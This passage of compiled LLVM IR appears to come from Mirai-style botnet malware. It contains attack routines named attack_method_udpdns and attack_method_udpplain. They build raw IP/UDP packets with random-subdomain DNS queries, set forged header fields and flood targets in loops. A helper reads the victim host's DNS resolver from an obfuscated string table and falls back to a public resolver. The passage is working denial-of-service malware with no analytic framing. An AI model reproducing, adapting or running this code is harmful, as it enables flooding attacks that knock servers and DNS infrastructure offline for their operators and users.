  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %140, i32 0
  %142 = bitcast %struct.sockaddr_in* %141 to %struct.sockaddr*
  %143 = call i64 @sendto(i32 %23, i8* %93, i64 %138, i32 16384, %struct.sockaddr* %142, i32 16) #10
  %144 = load i32, i32* %5, align 4
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %5, align 4
  %146 = icmp slt i32 %145, %29
  br i1 %146, label %.lr.ph, label %.loopexit.loopexit

; <label>:147:                                    ; preds = %4, %32
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 53)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 9, i32 65535)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 12)
  %24 = trunc i32 %23 to i8
  %25 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %26 = tail call fastcc i32 @get_dns_resolver()
  %27 = icmp eq i8* %25, null
  br i1 %27, label %185, label %28

; <label>:28:                                     ; preds = %4
  %29 = tail call i32 @util_strlen(i8* nonnull %25) #10
  %30 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %185, label %32

; <label>:32:                                     ; preds = %28
  store i32 1, i32* %5, align 4
  %33 = bitcast i32* %5 to i8*
  %34 = call i32 @setsockopt(i32 %30, i32 0, i32 3, i8* nonnull %33, i32 4) #10
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %50, label %.preheader122

.preheader122:                                    ; preds = %32
  store i32 0, i32* %5, align 4
  %36 = zext i8 %0 to i32
  %37 = icmp eq i8 %0, 0
  br i1 %37, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader122
  %.mask121 = and i32 %23, 255
  %38 = zext i32 %.mask121 to i64
  %39 = sext i32 %29 to i64
  %40 = add nuw nsw i64 %38, 47
  %41 = add nsw i64 %40, %39
  %42 = trunc i64 %41 to i16
  %43 = icmp eq i8 %16, 0
  %44 = add nuw nsw i64 %38, 27
  %45 = add nsw i64 %44, %39
  %46 = trunc i64 %45 to i16
  %47 = add nsw i32 %29, 1
  %48 = icmp sgt i32 %29, 0
  %wide.trip.count = zext i32 %29 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %49 = icmp eq i32 %29, 1
  br label %67

; <label>:50:                                     ; preds = %32
  %51 = call i32 @close(i32 %30) #10
  br label %185

.preheader.loopexit:                              ; preds = %._crit_edge
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader122
  %52 = icmp eq i8 %0, 0
  %53 = and i32 %11, 65535
  %54 = icmp eq i32 %53, 65535
  %55 = and i32 %17, 65535
  %56 = icmp eq i32 %55, 65535
  %57 = and i32 %19, 65535
  %58 = icmp eq i32 %57, 65535
  %59 = and i32 %21, 65535
  %60 = icmp eq i32 %59, 65535
  %61 = and i32 %23, 255
  %62 = sext i32 %29 to i64
  %63 = add nuw nsw i32 %61, 27
  %64 = add i32 %63, %29
  %addconv132 = add nuw nsw i32 %61, 47
  %65 = zext i32 %addconv132 to i64
  %66 = add nsw i64 %65, %62
  br label %.loopexit

; <label>:67:                                     ; preds = %.lr.ph130, %._crit_edge
  %68 = call noalias i8* @calloc(i64 600, i64 1) #10
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8*, i8** %8, i64 %70
  store i8* %68, i8** %71, align 8
  %72 = getelementptr inbounds i8, i8* %68, i64 20
  %73 = getelementptr inbounds i8, i8* %68, i64 28
  %74 = getelementptr inbounds i8, i8* %68, i64 40
  store i8 69, i8* %68, align 4
  %75 = getelementptr inbounds i8, i8* %68, i64 1
  store i8 %10, i8* %75, align 1
  %76 = call zeroext i16 @htons(i16 zeroext %42) #11
  %77 = getelementptr inbounds i8, i8* %68, i64 2
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = call zeroext i16 @htons(i16 zeroext %12) #11
  %80 = getelementptr inbounds i8, i8* %68, i64 4
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 4
  %82 = getelementptr inbounds i8, i8* %68, i64 8
  store i8 %14, i8* %82, align 4
  br i1 %43, label %87, label %83

; <label>:83:                                     ; preds = %67
  %84 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %85 = getelementptr inbounds i8, i8* %68, i64 6
  %86 = bitcast i8* %85 to i16*
  store i16 %84, i16* %86, align 2
  br label %87

; <label>:87:                                     ; preds = %67, %83
  %88 = getelementptr inbounds i8, i8* %68, i64 9
  store i8 17, i8* %88, align 1
  %89 = load i32, i32* @LOCAL_ADDR, align 4
  %90 = getelementptr inbounds i8, i8* %68, i64 12
  %91 = bitcast i8* %90 to i32*
  store i32 %89, i32* %91, align 4
  %92 = getelementptr inbounds i8, i8* %68, i64 16
  %93 = bitcast i8* %92 to i32*
  store i32 %26, i32* %93, align 4
  %94 = call zeroext i16 @htons(i16 zeroext %18) #11
  %95 = bitcast i8* %72 to i16*
  store i16 %94, i16* %95, align 2
  %96 = call zeroext i16 @htons(i16 zeroext %20) #11
  %97 = getelementptr inbounds i8, i8* %68, i64 22
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %46) #11
  %100 = getelementptr inbounds i8, i8* %68, i64 24
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 2
  %102 = call zeroext i16 @htons(i16 zeroext %22) #11
  %103 = bitcast i8* %73 to i16*
  store i16 %102, i16* %103, align 2
  %104 = call zeroext i16 @htons(i16 zeroext 256) #11
  %105 = getelementptr inbounds i8, i8* %68, i64 30
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @htons(i16 zeroext 1) #11
  %108 = getelementptr inbounds i8, i8* %68, i64 32
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  %110 = getelementptr inbounds i8, i8* %68, i64 41
  store i8 %24, i8* %74, align 1
  %111 = getelementptr inbounds i8, i8* %110, i64 %38
  %112 = getelementptr inbounds i8, i8* %111, i64 1
  call void @util_memcpy(i8* %112, i8* nonnull %25, i32 %47) #10
  br i1 %48, label %.lr.ph128.preheader, label %._crit_edge

.lr.ph128.preheader:                              ; preds = %87
  br i1 %lcmp.mod, label %.lr.ph128.prol.loopexit.unr-lcssa, label %.lr.ph128.prol.preheader

.lr.ph128.prol.preheader:                         ; preds = %.lr.ph128.preheader
  br label %.lr.ph128.prol

.lr.ph128.prol:                                   ; preds = %.lr.ph128.prol.preheader
  %113 = load i8, i8* %25, align 1
  %114 = icmp eq i8 %113, 46
  br i1 %114, label %116, label %115

; <label>:115:                                    ; preds = %.lr.ph128.prol
  br label %118

; <label>:116:                                    ; preds = %.lr.ph128.prol
  store i8 0, i8* %111, align 1
  %117 = getelementptr inbounds i8, i8* %111, i64 1
  br label %118

; <label>:118:                                    ; preds = %116, %115
  %.1119.prol = phi i8* [ %117, %116 ], [ %111, %115 ]
  %.1.prol = phi i8 [ 0, %116 ], [ 1, %115 ]
  br label %.lr.ph128.prol.loopexit.unr-lcssa

.lr.ph128.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph128.preheader, %118
  %.1119.lcssa.unr.ph = phi i8* [ %.1119.prol, %118 ], [ undef, %.lr.ph128.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %118 ], [ undef, %.lr.ph128.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %118 ], [ 0, %.lr.ph128.preheader ]
  %.0115126.unr.ph = phi i8 [ %.1.prol, %118 ], [ 0, %.lr.ph128.preheader ]
  %.0118124.unr.ph = phi i8* [ %.1119.prol, %118 ], [ %111, %.lr.ph128.preheader ]
  br label %.lr.ph128.prol.loopexit

.lr.ph128.prol.loopexit:                          ; preds = %.lr.ph128.prol.loopexit.unr-lcssa
  br i1 %49, label %._crit_edge.loopexit, label %.lr.ph128.preheader.new

.lr.ph128.preheader.new:                          ; preds = %.lr.ph128.prol.loopexit
  br label %.lr.ph128

.lr.ph128:                                        ; preds = %191, %.lr.ph128.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph128.preheader.new ], [ %indvars.iv.next.1, %191 ]
  %.0115126 = phi i8 [ %.0115126.unr.ph, %.lr.ph128.preheader.new ], [ %.1.1, %191 ]
  %.0118124 = phi i8* [ %.0118124.unr.ph, %.lr.ph128.preheader.new ], [ %.1119.1, %191 ]
  %119 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv
  %120 = load i8, i8* %119, align 1
  %121 = icmp eq i8 %120, 46
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %.lr.ph128
  store i8 %.0115126, i8* %.0118124, align 1
  %123 = getelementptr inbounds i8, i8* %111, i64 %indvars.iv
  %124 = getelementptr inbounds i8, i8* %123, i64 1
  br label %.lr.ph128.1133

; <label>:125:                                    ; preds = %.lr.ph128
  %126 = add i8 %.0115126, 1
  br label %.lr.ph128.1133

.lr.ph128.1133:                                   ; preds = %122, %125
  %.1119 = phi i8* [ %124, %122 ], [ %.0118124, %125 ]
  %.1 = phi i8 [ 0, %122 ], [ %126, %125 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %127 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv.next
  %128 = load i8, i8* %127, align 1
  %129 = icmp eq i8 %128, 46
  br i1 %129, label %188, label %186

._crit_edge.loopexit.unr-lcssa:                   ; preds = %191
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph128.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1119.lcssa = phi i8* [ %.1119.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1119.1, %._crit_edge.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %87
  %.0118.lcssa = phi i8* [ %111, %87 ], [ %.1119.lcssa, %._crit_edge.loopexit ]
  %.0115.lcssa = phi i8 [ 0, %87 ], [ %.1.lcssa, %._crit_edge.loopexit ]
  store i8 %.0115.lcssa, i8* %.0118.lcssa, align 1
  %130 = getelementptr inbounds i8, i8* %111, i64 %39
  %131 = getelementptr inbounds i8, i8* %130, i64 2
  %132 = bitcast i8* %131 to i16*
  store i16 %107, i16* %132, align 2
  %133 = getelementptr inbounds i8, i8* %131, i64 2
  %134 = bitcast i8* %133 to i16*
  store i16 %107, i16* %134, align 2
  %135 = load i32, i32* %5, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %5, align 4
  %137 = icmp slt i32 %136, %36
  br i1 %137, label %67, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %158
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %52, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %158
  %storemerge120123 = phi i32 [ %183, %158 ], [ 0, %.lr.ph.preheader ]
  %138 = sext i32 %storemerge120123 to i64
  %139 = getelementptr inbounds i8*, i8** %8, i64 %138
  %140 = load i8*, i8** %139, align 8
  %141 = bitcast i8* %140 to %struct.iphdr*
  %142 = getelementptr inbounds i8, i8* %140, i64 20
  %143 = getelementptr inbounds i8, i8* %140, i64 28
  %144 = getelementptr inbounds i8, i8* %140, i64 41
  br i1 %54, label %145, label %148

; <label>:145:                                    ; preds = %.lr.ph
  %146 = getelementptr inbounds i8, i8* %140, i64 4
  %147 = bitcast i8* %146 to i16*
  store i16 0, i16* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %.lr.ph
  br i1 %56, label %149, label %151

; <label>:149:                                    ; preds = %148
  %150 = bitcast i8* %142 to i16*
  store i16 0, i16* %150, align 2
  br label %151

; <label>:151:                                    ; preds = %149, %148
  br i1 %58, label %152, label %155

; <label>:152:                                    ; preds = %151
  %153 = getelementptr inbounds i8, i8* %140, i64 22
  %154 = bitcast i8* %153 to i16*
  store i16 0, i16* %154, align 2
  br label %155

; <label>:155:                                    ; preds = %152, %151
  br i1 %60, label %156, label %158

; <label>:156:                                    ; preds = %155
  %157 = bitcast i8* %143 to i16*
  store i16 0, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %156, %155
  call void @rand_alpha_str(i8* %144, i32 %61)
  %159 = getelementptr inbounds i8, i8* %140, i64 10
  %160 = bitcast i8* %159 to i16*
  store i16 0, i16* %160, align 2
  %161 = bitcast i8* %140 to i16*
  %162 = call zeroext i16 @checksum_generic(i16* %161, i32 20)
  store i16 %162, i16* %160, align 2
  %163 = getelementptr inbounds i8, i8* %140, i64 26
  %164 = bitcast i8* %163 to i16*
  store i16 0, i16* %164, align 2
  %165 = getelementptr inbounds i8, i8* %140, i64 24
  %166 = bitcast i8* %165 to i16*
  %167 = load i16, i16* %166, align 2
  %168 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %141, i8* %142, i16 zeroext %167, i32 %64)
  store i16 %168, i16* %164, align 2
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 2, i32 0
  store i32 %26, i32* %171, align 4
  %172 = getelementptr inbounds i8, i8* %140, i64 22
  %173 = bitcast i8* %172 to i16*
  %174 = load i16, i16* %173, align 2
  %175 = load i32, i32* %5, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %176, i32 0, i32 1
  store i16 %174, i16* %177, align 2
  %178 = sext i32 %175 to i64
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %178, i32 0
  %180 = bitcast %struct.sockaddr_in* %179 to %struct.sockaddr*
  %181 = call i64 @sendto(i32 %30, i8* %140, i64 %66, i32 16384, %struct.sockaddr* %180, i32 16) #10
  %182 = load i32, i32* %5, align 4
  %183 = add nsw i32 %182, 1
  store i32 %183, i32* %5, align 4
  %184 = icmp slt i32 %183, %36
  br i1 %184, label %.lr.ph, label %.loopexit.loopexit

; <label>:185:                                    ; preds = %28, %4, %50
  ret void

; <label>:186:                                    ; preds = %.lr.ph128.1133
  %187 = add i8 %.1, 1
  br label %191

; <label>:188:                                    ; preds = %.lr.ph128.1133
  store i8 %.1, i8* %.1119, align 1
  %189 = getelementptr inbounds i8, i8* %111, i64 %indvars.iv.next
  %190 = getelementptr inbounds i8, i8* %189, i64 1
  br label %191

; <label>:191:                                    ; preds = %188, %186
  %.1119.1 = phi i8* [ %190, %188 ], [ %.1119, %186 ]
  %.1.1 = phi i8 [ 0, %188 ], [ %187, %186 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph128
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 21)
  %3 = tail call i8* @table_retrieve_val(i32 21, i32* null)
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #10
  tail call void @table_lock_val(i8 zeroext 21)
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #10
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #10
  tail call void @table_unlock_val(i8 zeroext 22)
  %11 = tail call i8* @table_retrieve_val(i32 22, i32* null)
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #10
  call void @table_lock_val(i8 zeroext 22)
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = add nsw i32 %9, -1
  %16 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %17 = ashr exact i64 %sext, 32
  br label %18

; <label>:18:                                     ; preds = %.lr.ph, %39
  %indvars.iv = phi i64 [ %16, %.lr.ph ], [ %indvars.iv.next, %39 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %39 ]
  %19 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = icmp eq i8 %.02633, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %18
  switch i8 %20, label %23 [
    i8 32, label %39
    i8 9, label %39
  ]

; <label>:23:                                     ; preds = %22, %18
  %.1 = phi i8 [ %.02633, %18 ], [ 1, %22 ]
  %24 = icmp eq i8 %20, 46
  br i1 %24, label %29, label %25

; <label>:25:                                     ; preds = %23
  %.off = add i8 %20, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = trunc i64 %indvars.iv to i32
  %28 = icmp eq i32 %27, %15
  %or.cond29 = or i1 %28, %26
  br i1 %or.cond29, label %.critedge, label %39

; <label>:29:                                     ; preds = %23
  %30 = trunc i64 %indvars.iv to i32
  %.old28 = icmp eq i32 %30, %.old
  br i1 %.old28, label %.critedge, label %39

.critedge:                                        ; preds = %29, %25
  %31 = trunc i64 %indvars.iv to i32
  %32 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %33 = sext i32 %12 to i64
  %34 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %33
  %35 = sub nsw i32 %31, %12
  call void @util_memcpy(i8* nonnull %32, i8* %34, i32 %35) #10
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %36
  store i8 0, i8* %37, align 1
  %38 = call i32 @inet_addr(i8* nonnull %32) #10
  br label %42

; <label>:39:                                     ; preds = %25, %22, %22, %29
  %.2 = phi i8 [ %.1, %29 ], [ 0, %22 ], [ 0, %22 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %40 = icmp slt i64 %indvars.iv.next, %17
  br i1 %40, label %18, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %39
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %41 = call i32 @htonl(i32 134744072) #11
  br label %42

; <label>:42:                                     ; preds = %.loopexit, %.critedge
  %.0 = phi i32 [ %38, %.critedge ], [ %41, %.loopexit ]
  ret i32 %.0
}

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %59
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %59
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %59 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #11
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = load i32, i32* %44, align 4
  %49 = call i32 @bind(i32 %48, %struct.sockaddr* nonnull %31, i32 16) #10
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %51 = load i8, i8* %50, align 4
  %52 = icmp ult i8 %51, 32
  br i1 %52, label %53, label %59

; <label>:53:                                     ; preds = %47
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @ntohl(i32 %55) #11
  %57 = call i32 @htonl(i32 %56) #11
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %57, i32* %58, align 4
  br label %59

; <label>:59:                                     ; preds = %53, %47
  %60 = load i32, i32* %44, align 4
  %61 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %62 = call i32 @connect(i32 %60, %struct.sockaddr* %61, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %63 = icmp slt i64 %indvars.iv.next, %32
  br i1 %63, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %64 = icmp eq i8 %16, 0
  %65 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %70
  %.160 = phi i32 [ %.mux, %70 ], [ 0, %.lr.ph.preheader ]
  %66 = sext i32 %.160 to i64
  %67 = getelementptr inbounds i8*, i8** %8, i64 %66
  %68 = load i8*, i8** %67, align 8
  br i1 %64, label %70, label %69

; <label>:69:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %68, i32 %65)
  br label %70

; <label>:70:                                     ; preds = %.lr.ph, %69
  %71 = getelementptr inbounds i32, i32* %10, i64 %66
  %72 = load i32, i32* %71, align 4
  %73 = call i64 @send(i32 %72, i8* %68, i64 %34, i32 16384) #10
  %74 = add nsw i32 %.160, 1
  %75 = icmp slt i32 %74, %24
  %brmerge = or i1 %75, %33
  %.mux = select i1 %75, i32 %74, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %70
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.015.prol = phi i64 [ %11, %.lr.ph.prol ], [ 0, %.lr.ph.prol.preheader ]
  %.01114.prol = phi i32 [ %12, %.lr.ph.prol ], [ %1, %.lr.ph.prol.preheader ]
  %.01213.prol = phi i16* [ %8, %.lr.ph.prol ], [ %0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01213.prol, i64 1
  %9 = load i16, i16* %.01213.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.015.prol
  %12 = add i32 %.01114.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !1

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %.015.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01114.unr = phi i32 [ %1, %.lr.ph.preheader ], [ %12, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01213.unr = phi i16* [ %0, %.lr.ph.preheader ], [ %8, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.lcssa.unr = phi i64 [ undef, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %.015 = phi i64 [ %.015.unr, %.lr.ph.preheader.new ], [ %29, %.lr.ph ]
